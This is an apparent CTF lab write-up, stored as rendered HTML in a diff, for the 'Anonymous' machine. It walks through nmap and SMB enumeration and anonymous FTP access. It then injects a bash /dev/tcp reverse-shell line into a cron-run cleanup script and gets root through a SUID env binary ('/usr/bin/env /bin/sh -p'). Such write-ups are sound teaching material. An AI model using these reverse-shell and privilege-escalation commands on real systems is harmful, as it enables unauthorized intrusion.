@@ -1,0 +1,227 @@
+I"�2<h1 id="introduction">Introduction</h1>
+
+<p>Anonymous is a beginner CTF privesc challenge. You need to find 2 flags to complete the hack. This machine teaches us to gain access using cron jobs and privilege escalation using SUID binary.</p>
+
+<p><img src="/assets/images/05062020-anonymous/anonymous0.png" alt="anonymous image" /></p>
+
+<h1 id="enumeration">Enumeration</h1>
+
+<blockquote>
+  <p>Enumeration is defined as the process of extracting user names, machine names, network resources, shares, and services from a system. … The gathered information is used to identify the vulnerabilities or weak points in system security and tries to exploit the System gaining phase.</p>
+</blockquote>
+
+<p>Let’s start the enumeration process. Heuristic tinkering/passive scanning shows that there was no webserver running but FTP and SSH is running.</p>
+
+<h2 id="nmap">Nmap</h2>
+
+<blockquote>
+  <p>Nmap is a free and open-source network scanner created by Gordon Lyon. Nmap is used to discover hosts and services on a computer network by sending packets and analyzing the responses. Nmap provides a number of features for probing computer networks, including host discovery and service and operating system detection.</p>
+</blockquote>
+
+<p>Aggressive Nmap scan shows us the ports <code class="highlighter-rouge">21,22,139,445</code> are open.</p>
+
+<p><code class="highlighter-rouge">nmap -p- -A -T4 10.10.3.190 -oN nmap/full</code></p>
+
+<p><img src="/assets/images/05062020-anonymous/anonymous1.1.png" alt="nmap" /></p>
+
+<p>The <strong>FTP</strong>, <strong>SMB</strong> and <strong>SSH</strong> ports are open. let’s try enumerating the SMB shares first.</p>
+
+<h2 id="smb">SMB</h2>
+
+<p>let’s check the shares available.</p>
+
+<p><img src="/assets/images/05062020-anonymous/anonymous5.png" alt="enumeration" /></p>
+
+<p>Looks like <code class="highlighter-rouge">pics</code> share is available, with the comment <code class="highlighter-rouge">My SMB Share Directory for Pics</code>.</p>
+
+<p><strong>Pics</strong>? maybe something hidden inside using steganography?.</p>
+
+<p><img src="/assets/images/05062020-anonymous/anonymous6.png" alt="smb file listing" /></p>
+
+<p>We can see 2 image files <code class="highlighter-rouge">corgo2.jpg</code> and <code class="highlighter-rouge">puppos.jpeg</code>. let’s download it to our machine.</p>
+
+<p><img src="/assets/images/05062020-anonymous/anonymous7.png" alt="downloading files" /></p>
+
+<p>I tried <code class="highlighter-rouge">binwalk</code> on both files, turned out only <code class="highlighter-rouge">puppos.jpeg</code> file had something embedded inside. a TIFF file</p>
+
+<p><img src="/assets/images/05062020-anonymous/anonymous8.png" alt="binwalk" /></p>
+
+<p>let’s try to extract the embedded contents.</p>
+
+<p><img src="/assets/images/05062020-anonymous/anonymous9.png" alt="binwalk extraction" /></p>
+
+<p>The <code class="highlighter-rouge">C</code> file is the one embedded inside <code class="highlighter-rouge">puppos.jpeg</code>. I checked the file for some information but I got nothing in the end.</p>
+
+<p><img src="/assets/images/05062020-anonymous/anonymous10.png" alt="rabbit hole" /></p>
+
+<p>It was a rabbit hole.</p>
+
+<p><img src="https://media.giphy.com/media/zLCiUWVfex7ji/giphy.gif" alt="no results found" /></p>
+
+<p>Let’s move on to FTP and check if we get something interesting.</p>
+
+<h2 id="ftp">FTP</h2>
+
+<p>Let’s check for anonymous login via FTP.</p>
+
+<p><img src="/assets/images/05062020-anonymous/anonymous2.png" alt="ftp" /></p>
+
+<p>It worked. let’s check the contents.</p>
+
+<p><img src="/assets/images/05062020-anonymous/anonymous3.png" alt="ftp files list" /></p>
+
+<p>there are 3 interesting files <code class="highlighter-rouge">clean.sh</code>, <code class="highlighter-rouge">removed_files.log</code> and <code class="highlighter-rouge">to_do.txt</code>.</p>
+
+<p>let’s download the files to our kali machine.</p>
+
+<p><img src="/assets/images/05062020-anonymous/anonymous4.png" alt="get files from ftp" /></p>
+
+<h4 id="file-cleansh">FILE: clean.sh</h4>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
+
+<span class="nv">tmp_files</span><span class="o">=</span>0
+<span class="nb">echo</span> <span class="nv">$tmp_files</span>
+<span class="k">if</span> <span class="o">[</span> <span class="nv">$tmp_files</span><span class="o">=</span>0 <span class="o">]</span>
+<span class="k">then
+        </span><span class="nb">echo</span> <span class="s2">"Running cleanup script:  nothing to delete"</span> <span class="o">&gt;&gt;</span> /var/ftp/scripts/removed_files.log
+<span class="k">else
+    for </span>LINE <span class="k">in</span> <span class="nv">$tmp_files</span><span class="p">;</span> <span class="k">do
+        </span><span class="nb">rm</span> <span class="nt">-rf</span> /tmp/<span class="nv">$LINE</span> <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="s2">"</span><span class="si">$(</span><span class="nb">date</span><span class="si">)</span><span class="s2"> | Removed file /tmp/</span><span class="nv">$LINE</span><span class="s2">"</span> <span class="o">&gt;&gt;</span> /var/ftp/scripts/removed_files.log<span class="p">;</span><span class="k">done
+fi</span>
+
+</code></pre></div></div>
+
+<h4 id="file-removed_fileslog">FILE: removed_files.log</h4>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Running cleanup script:  nothing to delete
+Running cleanup script:  nothing to delete
+Running cleanup script:  nothing to delete
+Running cleanup script:  nothing to delete
+Running cleanup script:  nothing to delete
+Running cleanup script:  nothing to delete
+Running cleanup script:  nothing to delete
+Running cleanup script:  nothing to delete
+Running cleanup script:  nothing to delete
+Running cleanup script:  nothing to delete
+Running cleanup script:  nothing to delete
+Running cleanup script:  nothing to delete
+Running cleanup script:  nothing to delete
+</code></pre></div></div>
+
+<h4 id="file-to_dotxt">FILE: to_do.txt</h4>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>I really need to disable the anonymous login...it's really not safe
+
+</code></pre></div></div>
+
+<p>Indeed it is. Too late bruh! I already got the file 😆.</p>
+
+<p><img src="https://media.giphy.com/media/dZjlm0hDSBQYbDZQc9/giphy.gif" alt="too late" /></p>
+
+<p>Looks like the <code class="highlighter-rouge">clean.sh</code> file is running somewhere in the machine repeatedly that is generating that log file and it seems like we have write permission in FTP. What if we inject our code in the <code class="highlighter-rouge">clean.sh</code> file and get a reverse shell?</p>
+
+<p><img src="https://media.giphy.com/media/vJc55OQZMOojS/giphy.gif" alt="anonymous" /></p>
+
+<hr />
+
+<h1 id="gaining-access-reverse-shell">Gaining Access: Reverse Shell</h1>
+
+<p>First, we will mount the FTP as a file share and edit files using <code class="highlighter-rouge">curlFTPfs</code>.</p>
+
+<p><img src="/assets/images/05062020-anonymous/anonymous11.png" alt="curlFTPfs" /></p>
+
+<p>add <code class="highlighter-rouge">bash -i &gt;&amp; /dev/tcp/&lt;ip&gt;/&lt;port&gt; 0&gt;&amp;1</code> in <code class="highlighter-rouge">clean.sh</code> file.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
+bash <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/&lt;ip&gt;/&lt;port&gt; 0&gt;&amp;1
+<span class="nv">tmp_files</span><span class="o">=</span>0
+<span class="nb">echo</span> <span class="nv">$tmp_files</span>
+<span class="k">if</span> <span class="o">[</span> <span class="nv">$tmp_files</span><span class="o">=</span>0 <span class="o">]</span>
+<span class="k">then
+        </span><span class="nb">echo</span> <span class="s2">"Running cleanup script:  nothing to delete"</span> <span class="o">&gt;&gt;</span> /var/ftp/scripts/removed_files.log
+<span class="k">else
+    for </span>LINE <span class="k">in</span> <span class="nv">$tmp_files</span><span class="p">;</span> <span class="k">do
+        </span><span class="nb">rm</span> <span class="nt">-rf</span> /tmp/<span class="nv">$LINE</span> <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="s2">"</span><span class="si">$(</span><span class="nb">date</span><span class="si">)</span><span class="s2"> | Removed file /tmp/</span><span class="nv">$LINE</span><span class="s2">"</span> <span class="o">&gt;&gt;</span> /var/ftp/scripts/removed_files.log<span class="p">;</span><span class="k">done
+fi</span>
+
+</code></pre></div></div>
+
+<blockquote>
+  <p>Replace the &lt;ip&gt; and &lt;port&gt; with your ip and port number.</p>
+</blockquote>
+
+<p>now let’s open a Netcat listener using <code class="highlighter-rouge">nc -lvnp &lt;port&gt;</code>. wait for the <code class="highlighter-rouge">clean.sh</code> to run so that we can get a reverse shell.</p>
+
+<p><img src="https://media.giphy.com/media/xUPJPop2o56Sv8p8TS/giphy.gif" alt="5 hours later" /></p>
+
+<p><img src="/assets/images/05062020-anonymous/anonymous13.png" alt="netcat listener" /></p>
+
+<p>And we got it.</p>
+
+<p><img src="https://media.giphy.com/media/iOm1xOSfAtPzmPXJqH/giphy.gif" alt="we got him gif" /></p>
+
+<p>The file <code class="highlighter-rouge">user.txt</code> contains the user flag.</p>
+
+<p><img src="/assets/images/05062020-anonymous/anonymous14.png" alt="user flag" /></p>
+
+<hr />
+
+<h1 id="privilege-escalation">Privilege Escalation</h1>
+
+<p><code class="highlighter-rouge">sudo -l</code> asked for a password. Since we don’t know the password we can skip it.</p>
+
+<p>This time I used <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite">linpeas</a> script to enumerate the Linux machine.</p>
+
+<p><img src="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/linPEAS/images/peass.png" alt="linpeas" /></p>
+
+<p>When checking for SUID binaries. we can see <code class="highlighter-rouge">/usr/bin/env</code> has setuid bit set with <strong>root</strong> privileges. This means we can get a root shell by using <code class="highlighter-rouge">env</code> command.</p>
+
+<p><img src="/assets/images/05062020-anonymous/anonymous15.png" alt="setuid binary" />
+<img src="/assets/images/05062020-anonymous/anonymous16.png" alt="setuid flag" /></p>
+
+<p>Let’s head to <a href="https://gtfobins.github.io/gtfobins/env/">gtfobins</a> for the escalation command.</p>
+
+<p><img src="/assets/images/05062020-anonymous/anonymous17.png" alt="gtfobin command" /></p>
+
+<p>lets try executing <code class="highlighter-rouge">/usr/bin/env /bin/sh -p</code></p>
+
+<p><img src="/assets/images/05062020-anonymous/anonymous18.png" alt="priv esc" /></p>
+
+<p>And we got a <strong>root</strong> shell.</p>
+
+<p>With the root shell, we can read the contents of the root directory <em>(Actually we can read anything)</em> which contains the root flag.</p>
+
+<p><img src="/assets/images/05062020-anonymous/anonymous19.png" alt="root flag" /></p>
+
+<p><img src="https://media.giphy.com/media/3og0ILLVvPp8d64Jd6/giphy.gif" alt="game over" /></p>
+
+<hr />
+
+<h1 id="summary">Summary</h1>
+
+<ul>
+  <li>Nmap scan shows SSH, FTP and SMB ports are open</li>
+  <li>pics share was available in SMB which contains 2 image files.</li>
+  <li>The image files are nothing but the rabbit holes.</li>
+  <li>FTP had 3 files clean.sh, removed_files.log and to_do.txt</li>
+  <li>We identified that clean.sh was running somewhere, it may be using cron jobs.</li>
+  <li>To gain access, we first mount the FTP as a filesystem and injected reverse shell command.</li>
+  <li>With Netcat listener listening on the local kali machine, we got a reverse shell.</li>
+  <li>The user.txt contained a user flag.</li>
+  <li>For privilege escalation, the host machine is enumerated using linpeas script.</li>
+  <li>It showed the /usr/bin/env was set with setuid as root.</li>
+  <li>Using the command from gtfobins, we use env command to escalate root privilege.</li>
+  <li>The root flag was found in /root directory.</li>
+</ul>
+
+<hr />
+
+<h1 id="before-you-leave">Before you leave</h1>
+
+<p>If you have any constructive criticism or any questions, please drop an email at <a href="mailto:root@n0nu11.tech">root@n0nu11.tech</a> or ping me in <a href="https://instagram.com/dvlp.er">instagram</a>. I’ll be happy to hear your feedback.</p>
+
+<p>Follow me on  <a href="https://github.com/devwaseem"> <i class="fa fa-github"></i> Github</a>, <a href="https://twitter.com/iamwaseem99"><i class="fa fa-twitter"></i> Twitter</a>, <a href="https://www.instagram.com/dvlp.er/"><i class="fa fa-instagram"></i> Instagram</a>, <a href="https://www.facebook.com/dvlprwaseem"><i class="fa fa-facebook"></i> Facebook</a>, <a href="https://www.linkedin.com/in/devwaseem/"><i class="fa fa-linkedin"></i> LinkedIn</a>.</p>
+
+<p><img src="https://media.giphy.com/media/42D3CxaINsAFemFuId/giphy.gif" alt="bye" /></p>
+:ET
